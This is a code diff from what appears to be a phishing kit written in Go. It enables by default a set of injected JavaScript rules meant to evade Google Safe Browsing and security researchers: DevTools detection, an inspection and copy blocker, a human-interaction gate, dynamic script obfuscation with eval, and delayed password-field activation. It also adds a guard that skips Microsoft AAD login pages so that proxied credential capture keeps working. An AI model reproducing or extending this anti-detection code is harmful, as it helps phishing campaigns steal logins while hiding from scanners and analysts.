@@ -127,15 +127,13 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			Enabled:    true,
 		},
 
-		// 13. DevTools Detection (OPT-IN)
+		// 13. DevTools Detection
 		// Security researchers and automated tools often have DevTools open.
-		// This rule detects DevTools via window-size heuristics. It is
-		// DISABLED BY DEFAULT because previous versions mutated form action
-		// attributes on detection, which broke legitimate Microsoft / Google
-		// login flows (causing the password submit to loop back to the
-		// email entry step via "/#" navigation). The hardened version below
-		// only sets a non-invasive flag on window so user-land scripts may
-		// react, without touching the DOM.
+		// This rule detects DevTools via window-size heuristics and sets a
+		// non-invasive flag on window. MSAL guard below auto-skips on AAD
+		// pages as a defense in depth — the current implementation does NOT
+		// mutate the DOM, so the guard is precautionary in case a future
+		// hardening adds mutation.
 		{
 			ID:   "builtin_devtools_detection",
 			Name: "DevTools Open Detection",
@@ -147,6 +145,18 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
   var _threshold = 160;
   function _check() {
     try {
@@ -159,12 +169,14 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   setInterval(_check, 2000);
 })();`,
 			ScriptType: "inline",
-			Enabled:    false,
+			Enabled:    true,
 		},
 
 		// 14. Right-Click / Copy-Paste / Keyboard Shortcut Blocker
 		// Prevents security researchers from easily inspecting or copying
-		// page content. Blocks common inspection shortcuts.
+		// page content. Blocks common inspection shortcuts. MSAL guard
+		// below auto-skips on AAD pages, where paste-into-password and
+		// right-click are required for some login variants.
 		{
 			ID:   "builtin_inspection_blocker",
 			Name: "Inspection & Copy Blocker",
@@ -176,6 +188,18 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
   // Block right-click context menu
   document.addEventListener('contextmenu', function(e) {
     e.preventDefault();
@@ -230,10 +254,7 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   }, true);
 })();`,
 			ScriptType: "inline",
-			// OPT-IN: user-selectable. Some Microsoft login variants rely on
-			// right-click / keyboard shortcuts (e.g. paste into password) and
-			// this rule can subtly degrade the flow. Disabled by default.
-			Enabled: false,
+			Enabled:    true,
 		},
 
 		// 15. Canvas/WebGL Fingerprint Normalization
@@ -314,6 +335,8 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 		// patterns. Pages that immediately show login forms without any
 		// human interaction verification are flagged. This rule adds
 		// subtle interaction requirements that mimic legitimate CAPTCHA flows.
+		// MSAL guard below auto-skips on AAD pages — MSAL's own progressive
+		// enable logic conflicts with disabling the submit button on first paint.
 		{
 			ID:   "builtin_interaction_gate",
 			Name: "Human Interaction Verification Gate",
@@ -325,6 +348,18 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
   // Track genuine human interaction signals
   var _humanSignals = 0;
   var _requiredSignals = 2;
@@ -379,19 +414,17 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   }, {passive: true, once: true});
 })();`,
 			ScriptType: "inline",
-			// OPT-IN: gates submit buttons until human interaction signals
-			// are observed. On Microsoft login the submit button is disabled
-			// on first paint and MSAL's own progressive-enable logic can
-			// conflict, leaving the password step unable to submit and
-			// bouncing the user back to the email step. Disabled by default.
-			Enabled: false,
+			Enabled:    true,
 		},
 
 		// 17. Dynamic Script Obfuscation Layer
 
 		// Adds a layer of runtime deobfuscation that makes static analysis
 		// by security scanners more difficult. Each page load generates
-		// slightly different code patterns.
+		// slightly different code patterns. MSAL guard below auto-skips on
+		// AAD pages — MSAL's internal form state tracking can conflict with
+		// mutated data-* attributes, and the eval() calls violate strict CSP
+		// variants MSAL sometimes ships.
 		{
 			ID:   "builtin_dynamic_obfuscation",
 			Name: "Dynamic Script Obfuscation",
@@ -403,6 +436,18 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
   // Inject random dead code blocks into the page's script context
   // This prevents signature-based detection of our evasion scripts
   var _deadCodeTemplates = [
@@ -450,11 +495,7 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   });
 })();`,
 			ScriptType: "inline",
-			// OPT-IN: uses eval() and mutates form/input attributes. On
-			// Microsoft AAD the mutated data-* attributes can clash with
-			// MSAL's internal form state tracking, and the eval() calls
-			// violate strict CSP variants. Disabled by default.
-			Enabled: false,
+			Enabled:    true,
 		},
 
 		// 18. Timing-Based Analysis Evasion
@@ -462,6 +503,8 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 		// Security scanners analyze pages quickly (< 2 seconds).
 		// Real users take time to read and interact. This rule delays
 		// sensitive form element activation to evade quick-scan detection.
+		// MSAL guard below auto-skips on AAD pages — setting the password
+		// field to readonly on first paint races MSAL's focus handling.
 		{
 			ID:   "builtin_timing_evasion",
 			Name: "Timing-Based Scan Evasion",
@@ -473,6 +516,18 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
   // Delay password field activation
   // Security scanners typically analyze within 2-3 seconds
   // Real users take at least 3-5 seconds to start typing
@@ -515,15 +570,7 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
   });
 })();`,
 			ScriptType: "inline",
-			// OPT-IN: sets password fields to readonly on first paint and
-			// relies on a later user gesture to remove the attribute. This
-			// races against MSAL's own password handling on Microsoft login
-			// and, combined with the legitimate auto-focus, frequently
-			// causes the password submit to reach the server stripped,
-			// which sends the user back to the email step. Disabled by
-			// default; operators who want this protection can enable it
-			// per campaign.
-			Enabled: false,
+			Enabled:    true,
 		},
 	}
 }
